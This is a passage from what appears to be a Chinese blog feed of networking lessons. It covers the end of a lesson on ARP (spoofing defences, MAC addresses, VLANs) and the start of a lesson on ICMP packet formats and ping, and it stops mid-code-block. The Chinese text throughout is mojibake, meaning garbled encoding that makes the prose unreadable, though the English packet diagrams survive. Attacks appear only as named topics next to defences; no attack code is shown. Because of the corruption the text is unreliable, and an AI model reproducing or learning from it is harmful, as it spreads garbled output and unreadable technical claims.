å¯†åè®®</li><li>éƒ¨ç½²ARPç›‘æ§å·¥å…·</li><li>VLANéš”ç¦»</li></ol><p><strong>Q4ï¼šè·¨è·¯ç”±å™¨èƒ½ARPå—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¸èƒ½ï¼ARPåªåœ¨å±€åŸŸç½‘å†…å·¥ä½œ</li><li>è·¯ç”±å™¨ä¸è½¬å‘ARPå¹¿æ’­</li><li>è·¨ç½‘æ®µé€šä¿¡éœ€è¦è·¯ç”±</li><li>è·¯ç”±å™¨ä¼šä»£ç†ARPï¼ˆå¦‚æœå¯ç”¨ï¼‰</li></ul><p><strong>Q5ï¼šIPv6è¿˜ç”¨ARPå—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¸ç”¨ARP</li><li>ä½¿ç”¨NDPï¼ˆé‚»å±…å‘ç°åè®®ï¼‰</li><li>åŸºäºICMPv6</li><li>åŠŸèƒ½æ›´å¼ºå¤§</li></ul><hr><h2 id="10-æ€»ç»“"><a href="#10-æ€»ç»“" class="headerlink" title="10. æ€»ç»“"></a>10. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>ARPåè®®</strong>ï¼š</p><ul><li>IPåœ°å€ â†’ MACåœ°å€æ˜ å°„</li><li>å¹¿æ’­è¯·æ±‚ + å•æ’­åº”ç­”</li><li>ARPç¼“å­˜æé«˜æ•ˆç‡</li></ul></li><li><p><strong>ARPå·¥ä½œæµç¨‹</strong>ï¼š</p><ul><li>æŸ¥è¯¢ARPç¼“å­˜</li><li>å‘é€ARPè¯·æ±‚ï¼ˆå¹¿æ’­ï¼‰</li><li>æ¥æ”¶ARPåº”ç­”ï¼ˆå•æ’­ï¼‰</li><li>æ›´æ–°ç¼“å­˜</li><li>å‘é€æ•°æ®</li></ul></li><li><p><strong>ARPæŠ¥æ–‡æ ¼å¼</strong>ï¼š</p><ul><li>28å­—èŠ‚å›ºå®šæ ¼å¼</li><li>åŒ…å«ç¡¬ä»¶å’Œåè®®åœ°å€</li><li>æ“ä½œå­—æ®µåŒºåˆ†è¯·æ±‚&#x2F;åº”ç­”</li></ul></li><li><p><strong>å…è´¹ARPå’Œä»£ç†ARP</strong>ï¼š</p><ul><li>å…è´¹ARPï¼šæ£€æµ‹å†²çªã€æ›´æ–°ç¼“å­˜</li><li>ä»£ç†ARPï¼šè·¯ç”±å™¨ä»£ç†å“åº”</li></ul></li><li><p><strong>ARPå®‰å…¨</strong>ï¼š</p><ul><li>ARPæ¬ºéª—&#x2F;ç¼“å­˜æŠ•æ¯’</li><li>ä¸­é—´äººæ”»å‡»</li><li>é˜²å¾¡æªæ–½ï¼šDAIã€é™æ€ARPã€ç›‘æ§</li></ul></li><li><p><strong>MACåœ°å€</strong>ï¼š</p><ul><li>48ä½ç‰©ç†åœ°å€</li><li>OUI + NIC</li><li>å•æ’­&#x2F;å¤šæ’­&#x2F;å¹¿æ’­</li></ul></li><li><p><strong>ä»¥å¤ªç½‘å¸§</strong>ï¼š</p><ul><li>ç›®æ ‡MAC + æºMAC + ç±»å‹ + æ•°æ® + FCS</li><li>æœ€å°64å­—èŠ‚ï¼Œæœ€å¤§1518å­—èŠ‚</li><li>MTU 1500å­—èŠ‚</li></ul></li><li><p><strong>VLAN</strong>ï¼š</p><ul><li>è™šæ‹Ÿå±€åŸŸç½‘</li><li>éš”ç¦»å¹¿æ’­åŸŸ</li><li>802.1Qæ ‡ç­¾</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ARPå·¥ä½œæµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> éœ€è¦MACåœ°å€<br><span class="hljs-bullet">2.</span> æŸ¥ARPç¼“å­˜ â†’ æœ‰ï¼šä½¿ç”¨ï¼›æ— ï¼šç»§ç»­<br><span class="hljs-bullet">3.</span> å¹¿æ’­ARPè¯·æ±‚<br><span class="hljs-bullet">4.</span> ç›®æ ‡ä¸»æœºå•æ’­åº”ç­”<br><span class="hljs-bullet">5.</span> æ›´æ–°ç¼“å­˜<br><span class="hljs-bullet">6.</span> å‘é€æ•°æ®<br><br>ARPæ¬ºéª—é˜²å¾¡ï¼š<br>ç½‘ç»œçº§ï¼šDAI + DHCP Snooping<br>ä¸»æœºçº§ï¼šé™æ€ARP + ç›‘æ§<br>åº”ç”¨çº§ï¼šä½¿ç”¨åŠ å¯†åè®®<br><br>MACåœ°å€ç»“æ„ï¼š<br>OUIï¼ˆ24ä½ï¼‰+ NICï¼ˆ24ä½ï¼‰<br>ç¬¬ä¸€å­—èŠ‚æœ€ä½ä½ï¼šå•æ’­/å¤šæ’­<br>ç¬¬ä¸€å­—èŠ‚ç¬¬äºŒä½ä½ï¼šå…¨çƒ/æœ¬åœ°<br></code></pre></td></tr></table></figure><h3 id="å®‰å…¨è­¦ç¤º"><a href="#å®‰å…¨è­¦ç¤º" class="headerlink" title="å®‰å…¨è­¦ç¤º"></a>å®‰å…¨è­¦ç¤º</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">âš ï¸ ARPåè®®æ²¡æœ‰è®¤è¯<br>âš ï¸ å®¹æ˜“è¢«æ¬ºéª—å’Œæ”»å‡»<br>âš ï¸ å¿…é¡»éƒ¨ç½²é˜²å¾¡æªæ–½<br>âš ï¸ ä½¿ç”¨åŠ å¯†åè®®ä¿æŠ¤æ•°æ®<br>âš ï¸ ä»…åœ¨æˆæƒç¯å¢ƒæµ‹è¯•æ”»å‡»æŠ€æœ¯<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬26å¤©ï¼šè·¯ç”±åè®®åŸºç¡€</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>è·¯ç”±åŸºç¡€æ¦‚å¿µ</li><li>é™æ€è·¯ç”±é…ç½®</li><li>åŠ¨æ€è·¯ç”±åè®®æ¦‚è¿°</li><li>RIPåè®®è¯¦è§£</li><li>OSPFåŸºç¡€</li><li>è·¯ç”±è¡¨åˆ†æ</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†ARPåè®®ï¼Œç†è§£äº†IPåœ°å€åˆ°MACåœ°å€çš„æ˜ å°„è¿‡ç¨‹ï¼Œä»¥åŠARPå®‰å…¨é—®é¢˜å’Œé˜²å¾¡æªæ–½ã€‚è¿™æ˜¯ç½‘ç»œé€šä¿¡çš„åŸºç¡€ï¼Œä¹Ÿæ˜¯ç½‘ç»œå®‰å…¨çš„é‡è¦ä¸€ç¯ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ è·¯ç”±åè®®ï¼Œäº†è§£æ•°æ®å¦‚ä½•åœ¨ä¸åŒç½‘ç»œé—´ä¼ è¾“ï¼</p><p><strong>è¿›åº¦ï¼š25&#x2F;180å¤©ï¼ˆ13.9%ï¼‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>24å¤©ï¼šICMPå’Œç½‘ç»œè¯Šæ–­å·¥å…·</title>
    <link href="/2025/11/10/24%E5%A4%A9%EF%BC%9AICMP%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/11/10/24%E5%A4%A9%EF%BC%9AICMP%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬24å¤©ï¼šICMPå’Œç½‘ç»œè¯Šæ–­å·¥å…·"><a href="#ç¬¬24å¤©ï¼šICMPå’Œç½‘ç»œè¯Šæ–­å·¥å…·" class="headerlink" title="ç¬¬24å¤©ï¼šICMPå’Œç½‘ç»œè¯Šæ–­å·¥å…·"></a>ç¬¬24å¤©ï¼šICMPå’Œç½‘ç»œè¯Šæ–­å·¥å…·</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£ICMPåè®®çš„ä½œç”¨å’Œå·¥ä½œåŸç†</li><li>æŒæ¡ICMPæŠ¥æ–‡æ ¼å¼å’Œç±»å‹</li><li>å­¦ä¹ ICMPv6çš„ç‰¹ç‚¹</li><li>æ·±å…¥ç†è§£pingçš„å·¥ä½œåŸç†</li><li>æŒæ¡tracerouteçš„å®ç°æœºåˆ¶</li><li>å­¦ä¼šä½¿ç”¨å„ç§ç½‘ç»œè¯Šæ–­å·¥å…·</li><li>å®ç°è‡ªå·±çš„pingå·¥å…·</li></ul><hr><h2 id="1-ICMPåè®®æ¦‚è¿°"><a href="#1-ICMPåè®®æ¦‚è¿°" class="headerlink" title="1. ICMPåè®®æ¦‚è¿°"></a>1. ICMPåè®®æ¦‚è¿°</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯ICMPï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯ICMPï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯ICMPï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯ICMPï¼Ÿ</h3><p><strong>ICMP &#x3D; Internet Control Message Protocolï¼ˆäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ICMPæ˜¯ä»€ä¹ˆï¼Ÿ<br><span class="hljs-bullet">- </span>IPå±‚çš„è¾…åŠ©åè®®<br><span class="hljs-bullet">- </span>ç”¨äºé”™è¯¯æŠ¥å‘Šå’Œç½‘ç»œè¯Šæ–­<br><span class="hljs-bullet">- </span>ä¸ä¼ è¾“ç”¨æˆ·æ•°æ®<br><span class="hljs-bullet">- </span>æ‰¿è½½åœ¨IPæ•°æ®åŒ…ä¸­<br><br>ç”Ÿæ´»æ¯”å–»ï¼š<br>å¦‚æœIPæ˜¯é‚®æ”¿ç³»ç»Ÿï¼ŒICMPå°±æ˜¯&quot;æŸ¥è¯¢å›æ‰§&quot;å’Œ&quot;é€€ä¿¡é€šçŸ¥&quot;<br><span class="hljs-bullet">- </span>åŒ…è£¹åˆ°äº†å—ï¼Ÿâ†’ pingï¼ˆå›å£°è¯·æ±‚/åº”ç­”ï¼‰<br><span class="hljs-bullet">- </span>åŒ…è£¹ä¸ºä»€ä¹ˆæ²¡åˆ°ï¼Ÿâ†’ ç›®æ ‡ä¸å¯è¾¾<br><span class="hljs-bullet">- </span>è·¯çº¿æ˜¯ä»€ä¹ˆï¼Ÿâ†’ tracerouteï¼ˆæ—¶é—´è¶…æ—¶ï¼‰<br><br>ç‰¹ç‚¹ï¼š<br>âœ… ç½‘ç»œå±‚åè®®ï¼ˆä½†æœåŠ¡äºIPï¼‰<br>âœ… é”™è¯¯æŠ¥å‘Š<br>âœ… ç½‘ç»œè¯Šæ–­<br>âœ… è·¯å¾„å‘ç°<br></code></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆéœ€è¦ICMPï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPåè®®çš„å±€é™æ€§ï¼š<br>âŒ IPå°½åŠ›è€Œä¸ºï¼Œä¸ä¿è¯é€è¾¾<br>âŒ ä¸æä¾›é”™è¯¯æŠ¥å‘Š<br>âŒ ä¸æä¾›åé¦ˆæœºåˆ¶<br>âŒ ä¸çŸ¥é“ç½‘ç»œçŠ¶æ€<br><br>ICMPçš„ä½œç”¨ï¼š<br>âœ… æŠ¥å‘Šä¼ è¾“é”™è¯¯<br>âœ… æä¾›ç½‘ç»œè¯Šæ–­<br>âœ… å¸®åŠ©è°ƒè¯•ç½‘ç»œ<br>âœ… å‘ç°ç½‘ç»œé—®é¢˜<br><br>å¸¸è§åœºæ™¯ï¼š<br><span class="hljs-bullet">- </span>ç›®æ ‡ä¸»æœºä¸å¯è¾¾<br><span class="hljs-bullet">- </span>ç½‘ç»œæ‹¥å¡ï¼ˆæºæŠ‘åˆ¶ï¼‰<br><span class="hljs-bullet">- </span>è·¯ç”±é‡å®šå‘<br><span class="hljs-bullet">- </span>è¶…æ—¶<br><span class="hljs-bullet">- </span>å‚æ•°é”™è¯¯<br></code></pre></td></tr></table></figure><h3 id="1-2-ICMPæŠ¥æ–‡æ ¼å¼"><a href="#1-2-ICMPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="1.2 ICMPæŠ¥æ–‡æ ¼å¼"></a>1.2 ICMPæŠ¥æ–‡æ ¼å¼</h3><p><strong>åŸºæœ¬æ ¼å¼</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ‰€æœ‰ICMPæŠ¥æ–‡çš„å‰8å­—èŠ‚æ ¼å¼ç›¸åŒï¼š<br><br><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|     Type      |     Code      |          Checksum             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    Rest of Header (4 bytes)                   |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                      Data Section                             |<br><span class="hljs-section">|                       (å¯å˜é•¿åº¦)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>å­—æ®µè¯´æ˜ï¼š<br><br>Type (ç±»å‹, 8ä½):<br><span class="hljs-bullet">- </span>æ ‡è¯†ICMPæ¶ˆæ¯ç±»å‹<br><span class="hljs-bullet">- </span>ä¸åŒç±»å‹æœ‰ä¸åŒåŠŸèƒ½<br><br>Code (ä»£ç , 8ä½):<br><span class="hljs-bullet">- </span>è¿›ä¸€æ­¥ç»†åˆ†ç±»å‹<br><span class="hljs-bullet">- </span>æä¾›æ›´è¯¦ç»†çš„ä¿¡æ¯<br><br>Checksum (æ ¡éªŒå’Œ, 16ä½):<br><span class="hljs-bullet">- </span>æ£€æµ‹æŠ¥æ–‡å®Œæ•´æ€§<br><span class="hljs-bullet">- </span>è¦†ç›–æ•´ä¸ªICMPæŠ¥æ–‡<br><br>Rest of Header (å‰©ä½™å¤´éƒ¨, 32ä½):<br><span class="hljs-bullet">- </span>æ ¹æ®ç±»å‹è€Œä¸åŒ<br><span class="hljs-bullet">- </span>å¯èƒ½åŒ…å«IDã€åºåˆ—å·ç­‰<br></code></pre></td></tr></table></figure><h3 id="1-3-ICMPæŠ¥æ–‡ç±»å‹"><a href="#1-3-ICMPæŠ¥æ–‡ç±»å‹" class="headerlink" title="1.3 ICMPæŠ¥æ–‡ç±»å‹"></a>1.3 ICMPæŠ¥æ–‡ç±»å‹</h3><p><strong>ä¸»è¦ç±»å‹</strong>ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-attribute">â”‚  Type   â”‚       åç§°         â”‚      ç”¨é€”       â”‚</span><br><span class="hljs-attribute">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span><br><span class="hljs-attribute">â”‚    0    â”‚  å›æ˜¾åº”ç­”          â”‚  pingå“åº”       â”‚</span><br><span class="hljs-attribute">â”‚    3    â”‚  ç›®æ ‡ä¸å¯è¾¾        â”‚  é”™è¯¯æŠ¥å‘Š       â”‚</span><br><span class="hljs-attribute">â”‚    4    â”‚  æºæŠ‘åˆ¶            â”‚  æ‹¥å¡æ§åˆ¶       â”‚</span><br><span class="hljs-attribute">â”‚    5    â”‚  é‡å®šå‘            â”‚  è·¯ç”±ä¼˜åŒ–       â”‚</span><br><span class="hljs-attribute">â”‚    8    â”‚  å›æ˜¾è¯·æ±‚          â”‚  pingè¯·æ±‚       â”‚</span><br><span class="hljs-attribute">â”‚   11    â”‚  è¶…æ—¶              â”‚  TTLè¿‡æœŸ        â”‚</span><br><span class="hljs-attribute">â”‚   12    â”‚  å‚æ•°é—®é¢˜          â”‚  IPå¤´éƒ¨é”™è¯¯     â”‚</span><br><span class="hljs-attribute">â”‚   13    â”‚  æ—¶é—´æˆ³è¯·æ±‚        â”‚  æ—¶é’ŸåŒæ­¥       â”‚</span><br><span class="hljs-attribute">â”‚   14    â”‚  æ—¶é—´æˆ³åº”ç­”        â”‚  æ—¶é’ŸåŒæ­¥       â”‚</span><br><span class="hljs-attribute">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">å¸¸ç”¨ç±»å‹è¯¦è§£ï¼š</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Type 0/8</span><span class="hljs-punctuation">:</span> <span class="hljs-string">å›æ˜¾åº”ç­”/è¯·æ±‚ï¼ˆEcho Reply/Requestï¼‰</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">pingä½¿ç”¨</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æµ‹è¯•è¿é€šæ€§</span><br><br><span class="hljs-attribute">Type 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç›®æ ‡ä¸å¯è¾¾ï¼ˆDestination Unreachableï¼‰</span><br><span class="hljs-attribute">Code 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç½‘ç»œä¸å¯è¾¾</span><br><span class="hljs-attribute">Code 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ä¸»æœºä¸å¯è¾¾</span><br><span class="hljs-attribute">Code 2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">åè®®ä¸å¯è¾¾</span><br><span class="hljs-attribute">Code 3</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç«¯å£ä¸å¯è¾¾</span><br><span class="hljs-attribute">Code 4</span><span class="hljs-punctuation">:</span> <span class="hljs-string">éœ€è¦åˆ†ç‰‡ä½†è®¾ç½®äº†DFæ ‡å¿—</span><br><span class="hljs-attribute">Code 6</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç›®æ ‡ç½‘ç»œæœªçŸ¥</span><br><br><span class="hljs-attribute">Type 5</span><span class="hljs-punctuation">:</span> <span class="hljs-string">é‡å®šå‘ï¼ˆRedirectï¼‰</span><br><span class="hljs-attribute">Code 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç½‘ç»œé‡å®šå‘</span><br><span class="hljs-attribute">Code 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ä¸»æœºé‡å®šå‘</span><br><br><span class="hljs-attribute">Type 11</span><span class="hljs-punctuation">:</span> <span class="hljs-string">è¶…æ—¶ï¼ˆTime Exceededï¼‰</span><br><span class="hljs-attribute">Code 0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">TTLåœ¨ä¼ è¾“ä¸­è¿‡æœŸ</span><br><span class="hljs-attribute">Code 1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">åˆ†ç‰‡é‡ç»„è¶…æ—¶</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-pingå·¥ä½œåŸç†"><a href="#2-pingå·¥ä½œåŸç†" class="headerlink" title="2. pingå·¥ä½œåŸç†"></a>2. pingå·¥ä½œåŸç†</h2><h3 id="2-1-pingæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#2-1-pingæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="2.1 pingæ˜¯ä»€ä¹ˆï¼Ÿ"></a>2.1 pingæ˜¯ä»€ä¹ˆï¼Ÿ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ping = Packet Internet Groperï¼ˆåˆ†ç»„ç½‘ç»œæ¢æµ‹å™¨ï¼‰<br><br>åŠŸèƒ½ï¼š<br><span class="hljs-bullet">-</span> æµ‹è¯•ç½‘ç»œè¿é€šæ€§<br><span class="hljs-bullet">-</span> æµ‹é‡å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰<br><span class="hljs-bullet">-</span> æ£€æµ‹ä¸¢åŒ…ç‡<br><span class="hljs-bullet">-</span> è¯Šæ–­ç½‘ç»œé—®é¢˜<br><br>å·¥ä½œåŸç†ï¼š<br><span class="hljs-bullet">1.</span> å‘é€ICMPå›æ˜¾è¯·æ±‚ï¼ˆType 8ï¼‰<br><span class="hljs-bullet">2.</span> ç›®æ ‡ä¸»æœºæ”¶åˆ°å<br><span class="hljs-bullet">3.</span> è¿”å›ICMPå›æ˜¾åº”ç­”ï¼ˆType 0ï¼‰<br><span class="hljs-bullet">4.</span> è®¡ç®—å¾€è¿”æ—¶é—´<br><br>ç”Ÿæ´»æ¯”å–»ï¼š<br>åƒåœ¨å±±è°·é‡Œå–Š&quot;å–‚ï½&quot;ï¼Œå¬åˆ°å›å£°å°±çŸ¥é“ï¼š<br><span class="hljs-bullet">-</span> å¯¹é¢æœ‰å±±ï¼ˆä¸»æœºå­˜åœ¨ï¼‰<br><span class="hljs-bullet">-</span> è·ç¦»å¤šè¿œï¼ˆRTTï¼‰<br><span class="hljs-bullet">-</span> å›å£°æ¸…æ™°åº¦ï¼ˆç½‘ç»œè´¨é‡ï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-2-pingæŠ¥æ–‡æ ¼å¼"><a href="#2-2-pingæŠ¥æ–‡æ ¼å¼" class="headerlink" title="2.2 pingæŠ¥æ–‡æ ¼å¼"></a>2.2 pingæŠ¥æ–‡æ ¼å¼</h3><p><strong>ICMPå›æ˜¾è¯·æ±‚&#x2F;åº”ç­”</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|     Type      |     Code      |          Checksum             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|           Identifier          |        Sequence Number        |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                           Data...                             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>è¯·æ±‚ï¼š<br>Type = 8 (Echo Request)<br>Code = 0<br><br>åº”ç­”ï¼š<br>Type = 0 (Echo Reply)<br>Code = 0<br><br>Identifier (æ ‡è¯†ç¬¦):<br><span class="hljs-bullet">- </span>è¿›ç¨‹ID<br><span class="hljs-bullet">- </span>åŒºåˆ†ä¸åŒpingè¿›ç¨‹<br><br>Sequence Number (åºåˆ—å·):<br><span class="hljs-bullet">- </span>æ ‡è¯†æ¯ä¸ªè¯·æ±‚<br><span class="hljs-bullet">- </span>é€’å¢<br><span class="hljs-bullet">- </span>ç”¨äºåŒ¹é…è¯·æ±‚å’Œåº”ç­”<br><span class="hljs-bullet">- </span>æ£€æµ‹ä¸¢åŒ…å’Œä¹±åº<br><br>Data (æ•°æ®):<br><span class="hljs-bullet">- </span>å¯å˜é•¿åº¦<br><span class="hljs-bullet">- 